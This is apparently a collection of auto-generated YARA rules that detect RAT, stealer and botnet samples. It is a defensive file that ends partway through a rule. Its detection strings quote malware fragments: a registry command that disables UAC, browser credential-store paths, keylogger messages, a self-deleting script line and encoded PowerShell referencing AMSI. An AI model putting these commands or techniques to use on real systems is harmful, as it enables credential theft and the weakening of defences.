rule _QuasarRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__QuasarRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphas_57 {
   meta:
      description = "_subset_batch - from files QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash).exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_04e680c3.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_2d59db9f.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_3b31e670.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_907526c3.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_dfccc82a.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_ea90d10a.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_eb97b31c.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_f0059138.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_f602c038.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "8c88a4db8d0190a82df1edc21e226e5d481f7965b49387af6082bcf900f1b2b8"
      hash2 = "04e680c37b3e4dea85505d8b785912f9a9ad3c7bbfc440e1f1654fd06510bc3c"
      hash3 = "2d59db9fed703dc46e968e99ab95ff572fb8940c9d00c304ac58c512f37591ef"
      hash4 = "3b31e67097313350e8787223555ada0708a6b3bf86d0c8606c61d350954f62d6"
      hash5 = "907526c3c3900f327899c251e01e0bd5678774fc163f0c053eec4cbe1ea5e8b2"
      hash6 = "dfccc82ae13a9096e00d79fc4bb456c3999a8c7c857a66ef778add82c106bb93"
      hash7 = "ea90d10a0f856d00da2e68829e7c87e04f0d4834a05405cdbda1455c05f7de0f"
      hash8 = "eb97b31cf676ed7549a3f1e82bf546934f0509840c496e7eeccf428de1e93138"
      hash9 = "f00591384ec47004189f26bd3766220e991c70987e0c130331a32c38e3411584"
      hash10 = "f602c038f77842fd61953e3fbfa7ec9b085f829ce7376b77b22cb93fc4927d95"
   strings:
      $s1 = "GetProcessesResponse" fullword ascii /* score: '20.00'*/
      $s2 = "DoShellExecute" fullword ascii /* score: '18.00'*/
      $s3 = "DoShellExecuteResponse" fullword ascii /* score: '18.00'*/
      $s4 = "DoProcessEnd" fullword ascii /* score: '15.00'*/
      $s5 = "get_RootKeyName" fullword ascii /* score: '15.00'*/
      $s6 = "IMessageProcessor" fullword ascii /* score: '15.00'*/
      $s7 = "System.Collections.Generic.IEnumerator<System.Tuple<System.String,System.String>>.get_Current" fullword ascii /* score: '15.00'*/
      $s8 = "MessageProcessorBase`1" fullword ascii /* score: '15.00'*/
      $s9 = "System.Collections.Generic.IEnumerable<System.Tuple<System.String,System.String>>.GetEnumerator" fullword ascii /* score: '15.00'*/
      $s10 = "DoProcessResponse" fullword ascii /* score: '15.00'*/
      $s11 = "DoProcessStart" fullword ascii /* score: '15.00'*/
      $s12 = "CanExecuteFrom" fullword ascii /* score: '14.00'*/
      $s13 = "GetDeleteRegistryKeyResponse" fullword ascii /* score: '12.00'*/
      $s14 = "      <dpiAwareness xmlns=\"http://schemas.microsoft.com/SMI/2016/WindowsSettings\">PerMonitorV2, PerMonitor</dpiAwareness>" fullword ascii /* score: '12.00'*/
      $s15 = "GetConnectionsResponse" fullword ascii /* score: '12.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 11000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__fd885d0f_Mirai_signature__ff17f0a2_Mozi_signature__91643002_58 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_fd885d0f.elf, Mirai(signature)_ff17f0a2.elf, Mozi(signature)_91643002.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "fd885d0fd20880cb0b672755e7a9b5a1951a892596444c84fde18ed73b523b16"
      hash2 = "ff17f0a26a0b58f72d9333f7c1ad10f18d4f8cb420fb6bcbea21e56f65e28b09"
      hash3 = "91643002be04f1f63ddf2ab5122f1fa600b364ead3441f64511d3049c4aa57f6"
   strings:
      $s1 = "__pthread_mutex_init" fullword ascii /* score: '18.00'*/
      $s2 = "__pthread_mutex_trylock" fullword ascii /* score: '18.00'*/
      $s3 = "__pthread_mutex_unlock" fullword ascii /* score: '18.00'*/
      $s4 = "__pthread_mutex_lock" fullword ascii /* score: '18.00'*/
      $s5 = "__stdio_init_mutex" fullword ascii /* score: '15.00'*/
      $s6 = "__GI_gethostbyname_r" fullword ascii /* score: '14.00'*/
      $s7 = "get_hosts_byname_r.c" fullword ascii /* score: '14.00'*/
      $s8 = "gethostbyname.c" fullword ascii /* score: '14.00'*/
      $s9 = "__GI_gethostbyname" fullword ascii /* score: '14.00'*/
      $s10 = "gethostbyname_r.c" fullword ascii /* score: '14.00'*/
      $s11 = "__get_hosts_byname_r" fullword ascii /* score: '14.00'*/
      $s12 = "__read_etc_hosts_r" fullword ascii /* score: '12.00'*/
      $s13 = "read_etc_hosts_r.c" fullword ascii /* score: '12.00'*/
      $s14 = "__decode_header" fullword ascii /* score: '11.00'*/
      $s15 = "decoded.c" fullword ascii /* score: '11.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 400KB and ( 8 of them )
      ) or ( all of them )
}

rule _NanoCore_signature__646167cce332c1c252cdcb1839e0cf48_imphash__PDQConnect_signature__646167cce332c1c252cdcb1839e0cf48_imphas_59 {
   meta:
      description = "_subset_batch - from files NanoCore(signature)_646167cce332c1c252cdcb1839e0cf48(imphash).exe, PDQConnect(signature)_646167cce332c1c252cdcb1839e0cf48(imphash).exe, PDQConnect(signature)_646167cce332c1c252cdcb1839e0cf48(imphash)_92835df5.exe, PureLogsStealer(signature)_646167cce332c1c252cdcb1839e0cf48(imphash).exe, PureLogsStealer(signature)_646167cce332c1c252cdcb1839e0cf48(imphash)_59a9f58e.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "e1f00199faf5f9c3fd3e7745e063eefd63221132e45789ed11e0a3d6a4d4cb54"
      hash2 = "bbdc1202c69ce9c6ff5d2bbd11ad24f57fda5f92f0c045f86430cff52055a284"
      hash3 = "92835df531bcf71445504407e6af99aeaa88d72e8e86106dca37692807533feb"
      hash4 = "89659ed26bd98f9c6464c138dbda5af0aaf5a824a5e83024147d2ac088680d98"
      hash5 = "59a9f58e089576e053f87c747158987d3d6fd80bfd58ce3b82cfa3d3b4966228"
   strings:
      $s1 = " Shell32.DLL " fullword wide /* score: '24.00'*/
      $s2 = " OpenProcessToken.3" fullword wide /* score: '18.00'*/
      $s3 = " advpack.dll.H" fullword wide /* score: '16.00'*/
      $s4 = " Command /?." fullword wide /* score: '14.00'*/
      $s5 = "        <requestedExecutionLevel" fullword ascii /* score: '11.00'*/
      $s6 = "     processorArchitecture=\"x86\"" fullword ascii /* score: '10.00'*/
      $s7 = "  <description>IExpress extraction tool</description>" fullword ascii /* score: '10.00'*/
      $s8 = "          processorArchitecture=\"x86\"" fullword ascii /* score: '10.00'*/
      $s9 = "DSystem\\CurrentControlSet\\Control\\Session Manager" fullword ascii /* score: '10.00'*/
      $s10 = " Windows NT." fullword wide /* score: '9.00'*/
      $s11 = "/Q -- " fullword wide /* score: '9.00'*/
      $s12 = "/C -- " fullword wide /* score: '9.00'*/
      $s13 = "  <assemblyIdentity version=\"5.1.0.0\"" fullword ascii /* score: '8.00'*/
      $s14 = " GetProcAddress() " fullword wide /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 14000KB and pe.imphash() == "646167cce332c1c252cdcb1839e0cf48" and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__15ddcaed_RemcosRAT_signature__a6a51e66_RemcosRAT_signature__e80861f2_RemcosRAT_signature__fe386321_60 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_15ddcaed.bat, RemcosRAT(signature)_a6a51e66.bat, RemcosRAT(signature)_e80861f2.bat, RemcosRAT(signature)_fe386321.bat"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "15ddcaed4f9a9e7ef07e4f64b3850a76b0d8ac74971d770b936c6bce3e415e6b"
      hash2 = "a6a51e6620882856ea22eadca02f23db581bd19571c5461c28302da0f897c3c9"
      hash3 = "e80861f2196fcab3985e686094a14beb8bfbf6ebda37b466d9f514f4dec86b12"
      hash4 = "fe386321400e854668b2d82cb426c25936969b2c078d693a3d1290cc0634cfe9"
   strings:
      $s1 = "G8AbgBGAGwAYQBnAHMAKABbAFMAeQBzAHQAZQBtAC4AUgBlAGYAbABlAGMAdABpAG8AbgAuAE0AZQB0AGgAbwBkAEkAbQBwAGwAQQB0AHQAcgBpAGIAdQB0AGUAcwBdA" ascii /* score: '11.00'*/
      $s2 = "GIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4AUgB1AG4AdABpAG0AZQAuAEkAbgB0AGUAcgBvAHAAUwBlAHIAdgBpAGMAZQBzAC4ASABhAG4AZABsAGUAUgBlAGYAKABbA" ascii /* score: '11.00'*/
      $s3 = "HkATQBhAG4AYQBnAGUAcgAgAD0AIABbAFIAdQBuAHQAaQBtAGUALgBJAG4AdABlAHIAbwBwAFMAZQByAHYAaQBjAGUAcwAuAE0AYQByAHMAaABhAGwAXQANAAoAIAAgA" ascii /* score: '11.00'*/
      $s4 = "F0AXQBAACgANwAxACwAMQAwADEALAAxADEANgAsADgAMAAsADEAMQA0ACwAMQAxADEALAA5ADkALAA2ADUALAAxADAAMAAsADEAMAAwACwAMQAxADQALAAxADAAMQAsA" ascii /* score: '11.00'*/
      $s5 = "C0ARgB1AG4AYwB0AGkAbwBuAEEAZABkAHIAZQBzAHMAIAAkAEwAaQBiAHIAYQByAHkATgBhAG0AZQAgACQAUAByAG8AYwBlAGQAdQByAGUATgBhAG0AZQANAAoAIAAgA" ascii /* score: '11.00'*/
      $s6 = "G0ATQBhAG4AYQBnAGUAcgA6ADoAUgBlAGEAZABJAG4AdAAzADIAKABbAEkAbgB0AFAAdAByAF0AKAAkAGIAYQBzAGUAQQBkAGQAcgBlAHMAcwAgACsAIAAzADYAKQApA" ascii /* score: '11.00'*/
      $s7 = "HQAZQByAGYAYQBjAGUAVAB5AHAAZQBOAGEAbQBlACkADQAKAH0ADQAKAA0ACgBmAHUAbgBjAHQAaQBvAG4AIABSAGUAbQBvAHYAZQAtAEYAdQByAG4AaQB0AHUAcgBlA" ascii /* score: '11.00'*/
      $s8 = "HQAeQAgAD0AIAAkAGEAdQB0AG8AbQBhAHQAaQBvAG4AQQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAJwBhAG0AcwBpAEMAbwBuAHQAZQB4AHQAJwAsA" ascii /* score: '11.00'*/
      $s9 = "GUAcgAgAD0AIAAkAG0AZQBtAE0AYQBuAGEAZwBlAHIAOgA6AFIAZQBhAGQASQBuAHQANgA0ACgAWwBJAG4AdABQAHQAcgBdACQAYgBhAHMAZQBBAGQAZAByAGUAcwBzA" ascii /* score: '11.00'*/
      $s10 = "D0AIAAkAG0AZQBtAE0AYQBuAGEAZwBlAHIAOgA6AFIAZQBhAGQASQBuAHQANgA0ACgAWwBJAG4AdABQAHQAcgBdACQAcwBlAHIAdgBpAGMAZQBQAHIAbwB2AGkAZABlA" ascii /* score: '11.00'*/
      $s11 = "GUAcwBzACwAIABbAGkAbgB0AF0AJABTAGkAegBlACwAIABbAGkAbgB0AF0AJABQAHIAbwB0AGUAYwB0AGkAbwBuACwAIABbAHIAZQBmAF0AJABPAGwAZABQAHIAbwB0A" ascii /* score: '11.00'*/
      $s12 = "FAAUwBQAHIAbwB2AGkAZABlAHIAIABFAG4AdgBpAHIAbwBuAG0AZQBuAHQAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0A" ascii /* score: '11.00'*/
      $s13 = "HYAaQBkAGUAcgAgAD0AIAAkAG0AZQBtAE0AYQBuAGEAZwBlAHIAOgA6AFIAZQBhAGQASQBuAHQANgA0ACgAWwBJAG4AdABQAHQAcgBdACQAYgBhAHMAZQBBAGQAZAByA" ascii /* score: '11.00'*/
      $s14 = "GMAbwBkAGUAZABTAHQAcgBpAG4AZwApACkADQAKAH0ADQAKAA0ACgBmAHUAbgBjAHQAaQBvAG4AIABHAGUAdAAtAEYAdQBuAGMAdABpAG8AbgBBAGQAZAByAGUAcwBzA" ascii /* score: '11.00'*/
      $s15 = "GkAZQBzAC4ARwBlAHQATQBlAHQAaABvAGQAKAAnAFMAYwBhAG4AQwBvAG4AdABlAG4AdAAnACwAIABbAFMAeQBzAHQAZQBtAC4AUgBlAGYAbABlAGMAdABpAG8AbgAuA" ascii /* score: '11.00'*/
   condition:
      ( ( uint16(0) == 0x7725 or uint16(0) == 0x6425 or uint16(0) == 0x6125 or uint16(0) == 0x7425 ) and filesize < 3000KB and ( 8 of them )
      ) or ( all of them )
}

rule _PDQConnect_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__Rhadamanthys_signature__7e0a0e8f80bbd1a9c0078e57256f1c3d_im_61 {
   meta:
      description = "_subset_batch - from files PDQConnect(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash).exe, Rhadamanthys(signature)_7e0a0e8f80bbd1a9c0078e57256f1c3d(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "217cdab58a3e360e4d94cee5cb4e8cb3189f717171c38d07285314805320059d"
      hash2 = "4040d13f0ce5777ed8ed26bfbd2c6bdfbf2c4511b0aed0a8a3d624890e007042"
   strings:
      $x1 = "srvcli.dll" fullword wide /* reversed goodware string 'lld.ilcvrs' */ /* score: '33.00'*/
      $x2 = "devrtl.dll" fullword wide /* reversed goodware string 'lld.ltrved' */ /* score: '33.00'*/
      $x3 = "dfscli.dll" fullword wide /* reversed goodware string 'lld.ilcsfd' */ /* score: '33.00'*/
      $x4 = "browcli.dll" fullword wide /* reversed goodware string 'lld.ilcworb' */ /* score: '33.00'*/
      $x5 = "linkinfo.dll" fullword wide /* reversed goodware string 'lld.ofniknil' */ /* score: '33.00'*/
      $s6 = "atl.dll" fullword wide /* reversed goodware string 'lld.lta' */ /* score: '30.00'*/
      $s7 = "SSPICLI.DLL" fullword wide /* score: '23.00'*/
      $s8 = "UXTheme.dll" fullword wide /* score: '23.00'*/
      $s9 = "oleaccrc.dll" fullword wide /* score: '23.00'*/
      $s10 = "dnsapi.DLL" fullword wide /* score: '23.00'*/
      $s11 = "iphlpapi.DLL" fullword wide /* score: '23.00'*/
      $s12 = "WINNSI.DLL" fullword wide /* score: '23.00'*/
      $s13 = "sfxrar.exe" fullword ascii /* score: '22.00'*/
      $s14 = "Cannot create folder %sHChecksum error in the encrypted file %s. Corrupt file or wrong password." fullword wide /* score: '21.00'*/
      $s15 = "$GETPASSWORD1:IDC_PASSWORDENTER" fullword ascii /* score: '17.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 12000KB and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule _RedLineStealer_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__50b6f5dd_RemcosRAT_signature__f34d5f2d4577ed6d9ceec516c_62 {
   meta:
      description = "_subset_batch - from files RedLineStealer(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_50b6f5dd.exe, RemcosRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_3093077e.exe, RemcosRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_3543cabb.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "50b6f5dd983063b3c6870b256f8060c83882a5e9c1e94c2e2753b5e1df6d2ef0"
      hash2 = "3093077e390786c3463e88ea9520a2423102c90486b250fad40105fbad16285e"
      hash3 = "3543cabb8f07c2ca336999986b1889540db647c250dcf26db025f5d1139ec5e4"
   strings:
      $s1 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPADkF" fullword ascii /* score: '27.00'*/
      $s2 = "support@lotterysimulation.com" fullword wide /* score: '21.00'*/
      $s3 = "http://tempuri.org/DataSet1.xsd" fullword wide /* score: '17.00'*/
      $s4 = "https://github.com/lottery-simulation" fullword wide /* score: '17.00'*/
      $s5 = "Lottery Simulation - Main" fullword wide /* score: '12.00'*/
      $s6 = "columnHeaderLeastFreq" fullword ascii /* score: '9.00'*/
      $s7 = "columnHeaderMostPercent" fullword ascii /* score: '9.00'*/
      $s8 = "get_ConfirmClear" fullword ascii /* score: '9.00'*/
      $s9 = "columnHeaderNumbers" fullword ascii /* score: '9.00'*/
      $s10 = "get_DefaultMaxValue" fullword ascii /* score: '9.00'*/
      $s11 = "get_PlaySounds" fullword ascii /* score: '9.00'*/
      $s12 = "columnHeaderSet" fullword ascii /* score: '9.00'*/
      $s13 = "get_AutoSaveHistory" fullword ascii /* score: '9.00'*/
      $s14 = "columnHeaderLeastPercent" fullword ascii /* score: '9.00'*/
      $s15 = "get_DefaultMinValue" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 3000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _Rhadamanthys_signature__1aae8bf580c846f39c71c05898e57e88_imphash__Rhadamanthys_signature__d42595b695fc008ef2c56aabd8efd68e__63 {
   meta:
      description = "_subset_batch - from files Rhadamanthys(signature)_1aae8bf580c846f39c71c05898e57e88(imphash).exe, Rhadamanthys(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash)_984f14e5.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "2fa08478b989da7327bcb2c22eefc626126d357de831b8182474ba1ac6240033"
      hash2 = "984f14e5ffd9a1a2c5f6c1015b8b42cf2eab941e1bcccb2b176736b7ac8bebbb"
   strings:
      $x1 = "mheap.freeSpanLocked - invalid free of user arena chunkcasfrom_Gscanstatus:top gp->status is not in scan state is currently not " ascii /* score: '39.00'*/
      $s2 = "sDosDeviceName_UGetProcessMemoryInfobcryptprimitives.dlllink has been severedpackage not installedblock device requiredstate not" ascii /* score: '29.00'*/
      $s3 = " memory segmentruntime: netpoll: PostQueuedCompletionStatus failed (errno= runtime: malformed profBuf buffer - tag and data out " ascii /* score: '26.00'*/
      $s4 = "runtime.mutexSampleContention" fullword ascii /* score: '26.00'*/
      $s5 = " (types from different scopes)notetsleep - waitm out of syncfailed to get system page sizeruntime: found in object at *( in prep" ascii /* score: '23.00'*/
      $s6 = "lock: sleeping while lock is availableP has cached GC work at end of mark terminationfailed to acquire lock to start a GC transi" ascii /* score: '22.00'*/
      $s7 = "reeAddrInfoWgethostbynamegetservbynamewakeableSleepprofMemActiveprofMemFuturetraceStackTabexecRInternaltestRInternalGC sweep wai" ascii /* score: '22.00'*/
      $s8 = "time:scanstack: gp=scanstack - bad statusheadTailIndex overflowruntime.main not on m0set_crosscall2 missingbad g->status in read" ascii /* score: '21.00'*/
      $s9 = "updateMaxProcsGoroutine: phase errorruntime: bad notifyList size - sync=accessed data from freed user arena runtime: wrong gorou" ascii /* score: '21.00'*/
      $s10 = " s.sweepgen= allocCount page summaryProcessPrng" fullword ascii /* score: '20.00'*/
      $s11 = "23841857910156250123456789ABCDEFGODEBUG: value \"allowmultiplevcsDuplicateTokenExCreateNamedPipeWGetCurrentThreadGetModuleHandle" ascii /* score: '20.00'*/
      $s12 = "mheap.freeSpanLocked - invalid free of user arena chunkcasfrom_Gscanstatus:top gp->status is not in scan state is currently not " ascii /* score: '19.00'*/
      $s13 = "internal/runtime/maps.mapKeyError2" fullword ascii /* score: '18.00'*/
      $s14 = "work.nprocleft over markroot jobsgcDrain phase incorrectMB during sweep; swept bad profile stack countruntime: netpoll failedpan" ascii /* score: '18.00'*/
      $s15 = "resssocket type not supportedinvalid cross-device linkGetFinalPathNameByHandleWGetQueuedCompletionStatusUpdateProcThreadAttribut" ascii /* score: '18.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 8000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__1dac0fb7dad849409daf9e23353df461_imphash__RemcosRAT_signature__41e05d591d7d93bdd5bc6d5da04da74b_imphas_64 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_1dac0fb7dad849409daf9e23353df461(imphash).exe, RemcosRAT(signature)_41e05d591d7d93bdd5bc6d5da04da74b(imphash).exe, RemcosRAT(signature)_41e05d591d7d93bdd5bc6d5da04da74b(imphash)_9930e0ea.exe, RemcosRAT(signature)_5d354883fe6f15fcf48045037a99fb7a(imphash).exe, RemcosRAT(signature)_78a3bdf3c5b9bd3972e77fa90dce8f2d(imphash).exe, RemcosRAT(signature)_78a3bdf3c5b9bd3972e77fa90dce8f2d(imphash)_535e69c3.exe, RemcosRAT(signature)_e77512f955eaf60ccff45e02d69234de(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "523742b433e73faccb563bf9dec48ce0665c8235b3307aaab9347ce5d161de49"
      hash2 = "06a979c9e0cf816358fa58cc14f86084ed1bb0fb73115d18e7c946ffb6368f2a"
      hash3 = "9930e0eaf0d7bd3f6814f49b708747bfd87e46e857523ff46cca7523df4ed1f7"
      hash4 = "26abaf3d9827ba328a4b3fc0d47791827569705ea63707beb2d5290fcf387780"
      hash5 = "0dae83d8ad35f8be63d969586496c49c4fe6f60efdc9da136511b4b346c9d55d"
      hash6 = "535e69c35d99478d17214684b073b11ea834c3086d68bfb170e3157a09eeebbe"
      hash7 = "7f2fbcb6a1db5c448278aa42c5d43cb036905dfeafdc1edb3d8f38b57f0e9223"
   strings:
      $x1 = "C:\\Windows\\System32\\cmd.exe" fullword ascii /* score: '38.00'*/
      $x2 = "/k %windir%\\System32\\reg.exe ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWOR" ascii /* score: '34.00'*/
      $x3 = "/k %windir%\\System32\\reg.exe ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWOR" ascii /* score: '34.00'*/
      $s4 = "CreateObject(\"WScript.Shell\").Run \"cmd /c \"\"" fullword wide /* score: '26.00'*/
      $s5 = "\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\" fullword ascii /* score: '23.00'*/
      $s6 = "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data" fullword ascii /* score: '22.00'*/
      $s7 = "rmclient.exe" fullword wide /* score: '22.00'*/
      $s8 = "Keylogger initialization failure: error " fullword ascii /* score: '20.00'*/
      $s9 = "Online Keylogger Stopped" fullword ascii /* score: '17.00'*/
      $s10 = "Online Keylogger Started" fullword ascii /* score: '17.00'*/
      $s11 = "Offline Keylogger Started" fullword ascii /* score: '17.00'*/
      $s12 = "Offline Keylogger Stopped" fullword ascii /* score: '17.00'*/
      $s13 = "fso.DeleteFile(Wscript.ScriptFullName)" fullword wide /* score: '17.00'*/
      $s14 = "Executing file: " fullword ascii /* score: '16.00'*/
      $s15 = "\\logins.json" fullword ascii /* score: '16.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 1000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _Rhadamanthys_signature__4035d2883e01d64f3e7a9dccb1d63af5_imphash__Rhadamanthys_signature__93a138801d9601e4c36e6274c8b9d111__65 {
   meta:
      description = "_subset_batch - from files Rhadamanthys(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash).exe, Rhadamanthys(signature)_93a138801d9601e4c36e6274c8b9d111(imphash).exe, Rhadamanthys(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash).exe, Rhadamanthys(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash)_d99f5dd0.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "769de98d15369885e5dd8dac76722a72cab4999c4b6b70b5b111f6735399ce52"
      hash2 = "a17b22c0eedfc76e3c98dedb4f0c7655370a70a3a715d82f253b5b5824be6105"
      hash3 = "1c135fa1f43b3d884d9f826f9f4eb3895d9976609661a9d1e60e0752b938572c"
      hash4 = "d99f5dd0397a316ee7d28af1e8f5e5c558cacf00d3d21b10ef8135c94c9e3034"
   strings:
      $s1 = "unicode.Scripts" fullword ascii /* score: '17.00'*/
      $s2 = "unicode.IDS_Binary_Operator" fullword ascii /* score: '15.00'*/
      $s3 = "unicode.Common" fullword ascii /* score: '14.00'*/
      $s4 = "io.ErrClosedPipe" fullword ascii /* score: '13.00'*/
      $s5 = "unicode.Inscriptional_Pahlavi" fullword ascii /* score: '13.00'*/
      $s6 = "unicode.Inscriptional_Parthian" fullword ascii /* score: '13.00'*/
      $s7 = "unicode.Tagalog" fullword ascii /* score: '12.00'*/
      $s8 = "unicode.IDS_Trinary_Operator" fullword ascii /* score: '12.00'*/
      $s9 = "unicode.Logical_Order_Exception" fullword ascii /* score: '12.00'*/
      $s10 = "unicode.Grantha" fullword ascii /* score: '12.00'*/
      $s11 = "reflect.name.data" fullword ascii /* score: '11.00'*/
      $s12 = "unicode.Batak" fullword ascii /* score: '11.00'*/
      $s13 = "unicode.Runic" fullword ascii /* score: '10.00'*/
      $s14 = "runtime.mapiternext" fullword ascii /* score: '10.00'*/
      $s15 = "unicode.Nko" fullword ascii /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 11000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Rhadamanthys_signature__1aae8bf580c846f39c71c05898e57e88_imphash__Rhadamanthys_signature__4035d2883e01d64f3e7a9dccb1d63af5__66 {
   meta:
      description = "_subset_batch - from files Rhadamanthys(signature)_1aae8bf580c846f39c71c05898e57e88(imphash).exe, Rhadamanthys(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash).exe, Rhadamanthys(signature)_93a138801d9601e4c36e6274c8b9d111(imphash).exe, Rhadamanthys(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash).exe, Rhadamanthys(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash)_d99f5dd0.exe, Rhadamanthys(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe, Rhadamanthys(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash)_984f14e5.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "2fa08478b989da7327bcb2c22eefc626126d357de831b8182474ba1ac6240033"
      hash2 = "769de98d15369885e5dd8dac76722a72cab4999c4b6b70b5b111f6735399ce52"
      hash3 = "a17b22c0eedfc76e3c98dedb4f0c7655370a70a3a715d82f253b5b5824be6105"
      hash4 = "1c135fa1f43b3d884d9f826f9f4eb3895d9976609661a9d1e60e0752b938572c"
      hash5 = "d99f5dd0397a316ee7d28af1e8f5e5c558cacf00d3d21b10ef8135c94c9e3034"
      hash6 = "5a68af44b9399b0bf6e41e5d60b994251dedb610c700dcfd81198b67a0518d0e"
      hash7 = "984f14e5ffd9a1a2c5f6c1015b8b42cf2eab941e1bcccb2b176736b7ac8bebbb"
   strings:
      $s1 = "      <dpiAware xmlns=\"http://schemas.microsoft.com/SMI/2005/WindowsSettings\">true/pm</dpiAware> <!-- legacy -->" fullword ascii /* score: '25.00'*/
      $s2 = "reflect.Value.Complex" fullword ascii /* score: '14.00'*/
      $s3 = "runtime.nilinterhash" fullword ascii /* score: '13.00'*/
      $s4 = "runtime.expandCgoFrames" fullword ascii /* score: '13.00'*/
      $s5 = "unicode.FoldScript" fullword ascii /* score: '13.00'*/
      $s6 = "runtime.typehash" fullword ascii /* score: '13.00'*/
      $s7 = "runtime.interhash" fullword ascii /* score: '13.00'*/
      $s8 = "sync.(*Pool).Get" fullword ascii /* score: '12.00'*/
      $s9 = "unicode.foldLl" fullword ascii /* score: '12.00'*/
      $s10 = "    <asmv3:windowsSettings xmlns=\"http://schemas.microsoft.com/SMI/2017/WindowsSettings\">" fullword ascii /* score: '12.00'*/
      $s11 = "      <dpiAwareness xmlns=\"http://schemas.microsoft.com/SMI/2016/WindowsSettings\">permonitorv2,permonitor</dpiAwareness>" fullword ascii /* score: '12.00'*/
      $s12 = "      <!-- The ID below indicates application support for Windows 10 -->" fullword ascii /* score: '11.00'*/
      $s13 = "sync/atomic.CompareAndSwapPointer" fullword ascii /* score: '11.00'*/
      $s14 = "      <!-- The ID below indicates application support for Windows 8.1 -->" fullword ascii /* score: '11.00'*/
      $s15 = "      <!-- The ID below indicates application support for Windows 8 -->" fullword ascii /* score: '11.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 11000KB and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__e791f8773bf0061740713805d84feea8_imphash__Rhadamanthys_signature__01916ef7_Rhadamanthys_signature__ae9_67 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_e791f8773bf0061740713805d84feea8(imphash).exe, Rhadamanthys(signature)_01916ef7.exe, Rhadamanthys(signature)_ae9484be27b196745e2c08ee4e8427ca(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "cedcfe85d91b8e4cc835547efd2d7b761b4aad101f306435a925f708fbcf1037"
